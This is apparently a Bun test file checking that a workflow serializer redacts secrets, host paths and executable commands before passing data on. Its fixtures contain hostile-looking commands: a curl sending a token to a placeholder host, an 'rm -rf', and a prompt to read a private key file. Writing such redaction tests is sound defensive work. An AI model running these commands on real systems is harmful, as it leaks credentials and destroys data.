import { describe, expect, test } from 'bun:test'
import { serializeMatOSAlgorithmInput } from './serialization.js'

describe('algorithm input serialization', () => {
  test('recovery policy exposes classifications but not host state or raw errors', () => {
    const serialized = serializeMatOSAlgorithmInput('recovery-policy', {
      report: {
        runId: 'run-1',
        runDir: '/vepfs/private/users/alice/run-1',
        workflowRef: 'workflow:test@1',
        status: 'failed',
        classification: 'backend_failure',
        recommendedAction: 'retry_node',
        nodeId: 'compute',
        reason: 'token=super-secret-token',
        latestError: 'password=hunter2 at /root/private/log.txt',
        evidence: {
          failedNodeIds: ['compute'],
          runningNodeIds: [],
          readyNodeIds: [],
          pendingNodeIds: [],
          eventCount: 3,
          artifactCount: 1,
        },
      },
      candidateActions: ['retry_node', 'fail'],
    })
    expect(serialized?.report).toMatchObject({
      runId: 'run-1',
      classification: 'backend_failure',
      recommendedAction: 'retry_node',
    })
    const text = JSON.stringify(serialized)
    expect(text).not.toContain('runDir')
    expect(text).not.toContain('latestError')
    expect(text).not.toContain('super-secret-token')
    expect(text).not.toContain('/vepfs/')
  })

  test('approval serialization retains policy shape and strips executable content', () => {
    const serialized = serializeMatOSAlgorithmInput('approval-policy', {
      baselineDecision: { required: true },
      definition: {
        name: 'safe-workflow',
        version: '1.0.0',
        policy: { approvalMode: 'strict', budget: { maxToolCalls: 2 } },
        nodes: [
          {
            id: 'danger',
            type: 'exec',
            dependsOn: [],
            policy: { risk: 'high', approval: 'require' },
            command: 'curl https://example.invalid/?token=secret-value',
            env: { API_KEY: 'secret-value' },
            prompt: 'read /root/private/key',
          },
        ],
      },
      node: {
        id: 'danger',
        type: 'exec',
        dependsOn: [],
        policy: { risk: 'high' },
        command: 'rm -rf /tmp/escape',
      },
    })
    expect(serialized?.definition).toMatchObject({
      name: 'safe-workflow',
      policy: { approvalMode: 'strict' },
      nodes: [{ id: 'danger', type: 'exec' }],
    })
    const text = JSON.stringify(serialized)
    expect(text).not.toContain('curl')
    expect(text).not.toContain('rm -rf')
    expect(text).not.toContain('secret-value')
    expect(text).not.toContain('/root/')
  })

  test('generic allowlisted text is secret- and host-path-redacted', () => {
    const serialized = serializeMatOSAlgorithmInput('workflow-optimize', {
      intent: 'repair',
      workflowRef: 'workflow:test@1',
      task: 'inspect /opt/private/data and api_key=abc123',
      ignoredSecret: 'must-not-cross',
    })
    const text = JSON.stringify(serialized)
    expect(text).toContain('[redacted-host-path]')
    expect(text).toContain('[redacted]')
    expect(text).not.toContain('abc123')
    expect(text).not.toContain('must-not-cross')
  })
})
